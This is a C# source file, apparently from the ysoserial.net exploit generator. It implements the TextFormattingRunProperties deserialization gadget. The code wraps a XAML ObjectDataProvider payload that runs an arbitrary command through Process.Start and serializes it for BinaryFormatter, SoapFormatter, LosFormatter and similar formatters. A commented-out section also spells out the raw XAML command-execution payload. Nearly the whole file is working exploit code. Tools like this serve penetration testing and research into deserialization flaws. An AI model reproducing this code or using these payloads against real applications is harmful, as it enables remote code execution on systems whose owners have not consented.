﻿using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using Microsoft.VisualStudio.Text.Formatting;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }

    class TextFormattingRunPropertiesGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TextFormattingRunProperties";
        }

        public override string Description()
        {
            return "TextFormattingRunProperties gadget";
        }

        public override string Credit()
        {
            return "Oleksandr Mirosh and Alvaro Munoz";
        }

        public override bool isDerived()
        {
            return true;
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
        {
            // commented for future reference (research purposes)
            /*
            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
            
            String cmdPart;

            
            if (hasArgs)
            {
                cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
        <System:String>""" + splittedCMD[1] + @""" </System:String>";
            }
            else
            {
                cmdPart = $@"<System:String>" + splittedCMD[0] + @"</System:String>";
            }


            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
	 <ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
     <ObjectDataProvider.MethodParameters>
        "+ cmdPart + @"
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
            

            // This is a little bit shorter to use startinfo
            if (hasArgs)
            {
                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @""" Arguments=""" + splittedCMD[1] + @"""/>";
            }
            else
            {
                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @"""/>";
            }

            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
>
	 <ObjectDataProvider x:Key="""" MethodName=""Start"">
     <ObjectDataProvider.ObjectInstance>
        <Process xmlns=""clr-namespace:System.Diagnostics;assembly=system"">
            <Process.StartInfo>" + cmdPart + @"</Process.StartInfo>
        </Process>
     </ObjectDataProvider.ObjectInstance>
    </ObjectDataProvider>
</ResourceDictionary>";
            */
            return Serialize(TextFormattingRunPropertiesGadget(cmd, minify, useSimpleType), formatter, test, minify);
        }

        /* this can be used easily by the plugins as well */
        public static object TextFormattingRunPropertiesGadget(string cmd)
        {
            return TextFormattingRunPropertiesGadget(cmd, false, false);
        }

        public static object TextFormattingRunPropertiesGadget(string cmd, bool minify, Boolean useSimpleType)
        {
            ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
            string xaml_payload = myObjectDataProviderGenerator.Generate(cmd, "xaml", false, minify, useSimpleType).ToString();

            if (minify)
            {
                xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
            }

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            return payload;
        }
    }
}
